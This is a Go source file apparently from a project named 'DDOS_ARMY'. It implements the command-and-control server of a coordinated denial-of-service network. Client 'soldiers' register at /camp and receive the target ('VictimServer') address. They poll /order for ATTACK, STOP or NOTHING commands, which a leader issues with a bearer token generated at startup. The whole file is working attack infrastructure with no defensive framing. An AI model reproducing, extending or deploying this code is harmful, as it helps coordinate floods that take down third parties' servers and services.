package server

import (
	"DDOS_ARMY/camp"
	"container/list"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"github.com/fatih/color"
	"io"
	"log"
	"net"
	"net/http"
	"time"
)

var orderList list.List

// ORDER TYPE
const (
	ATTACK  = "ATTACK"
	STOP    = "STOP"
	NOTHING = "NOTHING"
)

var leaderCode string

func Ping(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if r.URL.Path != "/ping" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	w.Write([]byte("pong"))
}

func Camp(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/camp" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	c := camp.GetCamp()
	if r.Method == "POST" {
		//join camp
		var sl camp.Soldier
		err := json.NewDecoder(r.Body).Decode(&sl)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		sl.Ip = r.RemoteAddr
		sl.LastOrderRequestTime = time.Now()
		//check if soldier is already in camp
		if c.IsSoldierInCamp(sl.Name) {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("NO"))
			return
		}

		c.AddSoldier(sl)

		w.WriteHeader(http.StatusCreated)
		w.Write([]byte(c.VictimServer))
		log.Println("Soldier joined camp: ", sl.Name, "have ip ", r.RemoteAddr)

	} else if r.Method == "GET" {
		//get camp info
		w.Header().Set("Content-Type", "application/json")
		err := json.NewEncoder(w).Encode(c)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
}

func LeaveCamp(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/leave" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	if r.Method != "GET" {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	c := camp.GetCamp()
	queryParams := r.URL.Query()
	name := queryParams.Get("name")
	sl := c.GetSoldier(name)
	if sl == nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("You are not in the camp"))
		return
	}
	inIp, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		log.Println(err)
	}
	slIp, _, err := net.SplitHostPort(sl.Ip)
	if err != nil {
		log.Println(err)
	}
	if inIp != slIp || sl.Name != name {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("You are not in the camp"))
		return
	}

	c.RemoveSoldier(sl.Name)
	w.WriteHeader(http.StatusCreated)
	w.Write([]byte("you left the camp"))
	log.Println("Soldier left camp: ", "have ip ", r.RemoteAddr)
}

func Order(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/order" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	if r.Method == "POST" {
		authHeader := r.Header.Get("Authorization")

		sBearer := "Bearer " + leaderCode
		if authHeader != sBearer {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		b := r.Body
		defer b.Close()
		orderb, _ := io.ReadAll(b)
		order := string(orderb)
		order = order[1 : len(order)-1]
		if order != ATTACK && order != STOP && order != NOTHING {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		orderList.PushFront(order)
		log.Printf("Leader sent %v order\n", order)
		cp := camp.GetCamp()
		cp.Status = order
		w.Write([]byte("OK"))
	} else if r.Method == "GET" {
		if orderList.Len() == 0 {
			w.Write([]byte(NOTHING))
		} else {
			e := orderList.Front()
			w.Write([]byte(e.Value.(string)))
		}

		name := r.URL.Query().Get("name")
		c := camp.GetCamp()

		sl := c.GetSoldier(name)
		if sl == nil {
			w.Write([]byte("You are not in the camp"))
			return
		}
		inIp, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			log.Println(err)
		}
		slIp, _, err := net.SplitHostPort(sl.Ip)
		if err != nil {
			log.Println(err)
		}
		if inIp != slIp || sl.Name != name {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("You are not in the camp"))
			return
		}

		sl.UpdateLastOrderRequestTime()
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
}

func StartServer(address, port string) {
	log.Printf("Starting server on %s:%s", address, port)
	//create secret code for leader
	bytes := make([]byte, 8)
	_, err := rand.Read(bytes)
	if err != nil {
		panic(err)
	}
	leaderCode = base64.StdEncoding.EncodeToString(bytes)
	log.Printf("secret Leader code: %s", leaderCode)
	// always check soldier timeout and remove timeout soldiers
	go func() {
		for {
			c := camp.GetCamp()
			c.ScanAndRemoveTimeOutedSoldiers()
			time.Sleep(5 * time.Second)
		}
	}()

	http.HandleFunc("/ping", Ping)
	http.HandleFunc("/camp", Camp)
	http.HandleFunc("/order", Order)
	http.HandleFunc("/leave", LeaveCamp)
	err = http.ListenAndServe(address+":"+port, nil)
	if err != nil {
		color.Red("Error starting server: %s", err)
	}
}
